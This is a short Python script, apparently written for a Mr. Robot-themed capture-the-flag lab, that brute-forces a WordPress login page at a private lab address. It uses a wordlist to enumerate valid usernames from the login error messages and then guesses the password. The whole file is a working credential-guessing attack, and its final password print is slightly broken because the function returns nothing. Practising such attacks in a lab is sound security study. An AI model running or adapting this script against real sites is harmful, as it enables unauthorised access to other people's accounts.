#!/usr/bin/env python3

import requests

kamus=open('fsocity.dic', 'r').readlines()

URL= "http://10.10.171.29/wp-login.php"

invalidUsername="<strong>ERROR</strong>: Invalid username."
invalidPassword="<strong>ERROR</strong>: The password you entered for the username"

def doBruteLogin(username,password, invalidStr):
    data={"log":username, "pwd":password}
    r = requests.post(URL, data=data)
    if(invalidStr not in r.text):
        return (username,password)
    else:
        print(".", end="")
        return False

def bruteUsername():
    print("[+] Trying to brute username...")
    res=("","")
    for k in kamus:
        uname = k.strip()
        x = doBruteLogin(username=uname,password="test", invalidStr=invalidUsername)
        if(x != False):
            res = x
            break
    return res
    
def brutePassword(uname):
    for k in kamus:
        passwd = k.strip()
        x = doBruteLogin(username=uname,password=passwd, invalidStr=invalidPassword)
        if(x != False):
            print(f"[+] Found interesting  with {x[1]}")
            break
        
user_name = bruteUsername()
print(user_name)
if(user_name):
    print(f"[+] Found interesting {user_name[0]}")

password=brutePassword(user_name[0])
if(user_name):
    print(f"[+] Found interesting {password}")